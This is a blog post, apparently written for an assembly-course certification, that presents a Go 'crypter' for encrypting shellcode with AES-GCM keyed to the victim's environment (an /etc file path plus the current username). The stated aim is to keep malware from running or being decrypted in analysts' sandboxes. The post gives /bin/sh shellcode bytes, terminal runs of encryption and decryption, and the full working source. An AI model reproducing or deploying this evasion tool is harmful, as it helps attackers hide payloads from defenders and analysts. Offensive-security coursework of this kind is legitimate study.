
# Creating your own crypter using golang

In this article, we will build a simple crypter for encrypting and decrypting shellcode. I chose to implement the crypter in go using environmental keys.

## Encryption

The encryption/decryption process is using AES GCM and a specific file in `/etc/` concatenated with current user logged in as key. This is called *Environmental Keying*, meaning you use specific values found in the victim's environment such as files, hostname or users. The purpose of this is to make sure a given malware **only** executes in a given environment. This means the attacker needs to know details about the environment before encrypting any shellcode.

This also makes it difficult for any analysts trying to decrypt the shellcode. Because they would need the correct environment values in order to successfully decrypt the shellcode. Relying on dynamic analysis in a sandbox will is futile because of this reason.

The specific values that I have chosen for the key is the file path `/etc/vmware-tools/scripts/vmware/network` and current logged in user. The final key will look like this: `/etc/vmware-tools/scripts/vmware/networkdubs3c`.

The following example encrypts a simple shellcode that executes `/bin/sh`:

```
dubs3c@slae:~/SLAE/EXAM/github/assignment_7$ go run main.go -e -s "\xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde"
[+] Your encrypted shellcode: 5af9fb00a2147e12ba73c2686b1b25fac3f441ffcb6974b00ec7413208dc749dae128faf67a5db80fe868dc2386e30546409503beb9ea6973441dc0ace3b35563550e3041fdde2c234b7dbd36ce74f1653ac08ec3be1f6fac3dd6fc34b378477bf6a5acf7800d01ee1c9280d8f6e2ccb8b13f517e790cc6d6623df9b1ced1dc1ebd8df2caca412f6f9d8233bd233fd6c590b12211f0706fc18dca864e97908df4eb638c8b223afc57d59714db119a0075dc935a65a38b4fe175fc15ad2b03125303b98c991ac01238f61c10f444bd85ad081fe2d097f816345e2ab98436cae10033c1cd870502608eac6a3149688b992
dubs3c@slae:~/SLAE/EXAM/github/assignment_7$
```

## Decryption

The decryption process will loop over all files and folders in `/etc/` and try to use each file path as the key together with the username. When the correct key is found, the shellcode is decrypted.

Decrypting shellcode:

```
dubs3c@slae:~/SLAE/EXAM/github/assignment_7$ go run main.go -d -s "5af9fb00a2147e12ba73c2686b1b25fac3f441ffcb6974b00ec7413208dc749dae128faf67a5db80fe868dc2386e30546409503beb9ea6973441dc0ace3b35563550e3041fdde2c234b7dbd36ce74f1653ac08ec3be1f6fac3dd6fc34b378477bf6a5acf7800d01ee1c9280d8f6e2ccb8b13f517e790cc6d6623df9b1ced1dc1ebd8df2caca412f6f9d8233bd233fd6c590b12211f0706fc18dca864e97908df4eb638c8b223afc57d59714db119a0075dc935a65a38b4fe175fc15ad2b03125303b98c991ac01238f61c10f444bd85ad081fe2d097f816345e2ab98436cae10033c1cd870502608eac6a3149688b992"
[+] Decrypted shellcode: \xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde
dubs3c@slae:~/SLAE/EXAM/github/assignment_7$
```

## Final code

Below is the final program for encrypting/decrypting shellcode.

```go
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/sha256"
    "encoding/hex"
    "flag"
    "fmt"
    "io"
    "os"
    "os/user"
    "path/filepath"
)

type cliOptions struct {
    encrypt   bool
    decrypt   bool
    shellcode string
}

func processArgs() cliOptions {
    opts := cliOptions{}
    flag.BoolVar(&opts.decrypt, "decrypt", false, "Decrypt your shellcode")
    flag.BoolVar(&opts.decrypt, "d", false, "Decrypt your shellcode")
    flag.BoolVar(&opts.encrypt, "encrypt", false, "Encrypt your shellcode")
    flag.BoolVar(&opts.encrypt, "e", false, "Encrypt your shellcode")
    flag.StringVar(&opts.shellcode, "shellcode", "", "Your shellcode")
    flag.StringVar(&opts.shellcode, "s", "", "Your shellcode")
    flag.Parse()

    return opts
}

func init() {
    flag.Usage = func() {
        h := "\nEncrypt your shellcode! Very nice! Made by @dubs3c.\n\n"

        h += "Usage:\n"
        h += "  cyrptoBoot [shellcode] [options]\n\n"

        h += "Options:\n"
        h += "  -e,  --encrypt      Encrypt shellcode\n"
        h += "  -d,  --decrypt      Decrypt shellcode\n"
        h += "  -s,  --shellcode    Shellcode\n"
        h += "  -v,  --version      Show version\n"

        h += "\nExamples:\n"
        h += "  cryptoBoot -e -s \"<shellcode>\"\n"
        h += "  cryptoBoot -d -s \"<shellcode>\"\n"

        fmt.Fprintf(os.Stderr, h)
    }
}

func encrypt(shellcode string, envKey []byte) (encryptedShellcode []byte, err error) {
    plaintext := []byte(shellcode)

    block, err := aes.NewCipher(envKey)
    if err != nil {
        panic(err.Error())
    }

    // Never use more than 2^32 random nonces with a given key because of the risk of a repeat.
    nonce := make([]byte, 12)
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        panic(err.Error())
    }

    aesgcm, err := cipher.NewGCM(block)
    if err != nil {
        panic(err.Error())
    }

    ciphertext := aesgcm.Seal(nil, nonce, plaintext, nil)
    ciphertextWithNonce := append(nonce, ciphertext...)
    encodedCiphertext := make([]byte, hex.EncodedLen(len(ciphertextWithNonce)))
    hex.Encode(encodedCiphertext, ciphertextWithNonce)
    return encodedCiphertext, nil
}

func decrypt(ciphertext string, envKey []byte) (plaintext []byte, err error) {
    ciphertxt, _ := hex.DecodeString(ciphertext[24:])
    nonce, _ := hex.DecodeString(ciphertext[:24])

    block, err := aes.NewCipher(envKey)
    if err != nil {
        return []byte{}, err
    }

    aesgcm, err := cipher.NewGCM(block)
    if err != nil {
        return []byte{}, err
    }

    plaintxt, err := aesgcm.Open(nil, nonce, ciphertxt, nil)
    if err != nil {
        return []byte{}, err
    }

    return plaintxt, nil
}

func main() {

    if len(os.Args) <= 1 {
        flag.Usage()
        os.Exit(0)
    }

    opts := processArgs()

    currentUser := &user.User{}
    currentUser, err := user.Current()
    envPath := "/etc/vmware-tools/scripts/vmware/network"
    envKey := sha256.Sum256([]byte(envPath + currentUser.Username))

    if opts.encrypt {
        if opts.shellcode == "" {
            fmt.Println("[-] Please specify your shellcode")
            os.Exit(1)
        }

        ciphertext, err := encrypt(opts.shellcode, envKey[:])
        if err != nil {
            fmt.Println("[-] Something went wrong encrypting your shellcode. Error: ", err)
            os.Exit(1)
        }

        fmt.Printf("[+] Your encrypted shellcode: %s\n", ciphertext)
        return
    }

    if opts.decrypt {

        if opts.shellcode == "" {
            fmt.Println("[-] Please specify your encrypted shellcode")
            os.Exit(1)
        }

        encryptedShellcode := opts.shellcode

        err = filepath.Walk("/etc/", func(path string, info os.FileInfo, err error) error {
            envKey := sha256.Sum256([]byte(path + currentUser.Username))
            plaintext, err := decrypt(encryptedShellcode, envKey[:])
            if err != nil {
                // Disregard errors
                return nil
            } else {
                fmt.Printf("[+] Decrypted shellcode: %s\n", plaintext)
            }
            return nil
        })

        if err != nil {
            fmt.Printf("error walking the path %q: %v\n", "/etc/", err)
            return
        }
    }
}

```

---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[https://www.pentesteracademy.com/course?id=3](https://www.pentesteracademy.com/course?id=3)

Student ID: SLAE-1490
